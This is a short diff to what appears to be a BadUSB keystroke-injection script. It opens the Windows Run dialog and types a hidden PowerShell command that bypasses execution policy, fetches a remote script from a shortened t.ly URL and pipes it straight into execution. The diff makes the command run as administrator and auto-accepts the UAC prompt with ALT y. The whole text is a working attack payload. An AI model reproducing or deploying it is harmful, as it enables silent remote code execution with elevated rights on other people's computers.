@@ -12,4 +12,6 @@ DELAY 1000
 GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $url='File download link';$extension='exe/jpg/png/pdf/bat/ps1...';irm https://t.ly/IDPkt | iex
-ENTER
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
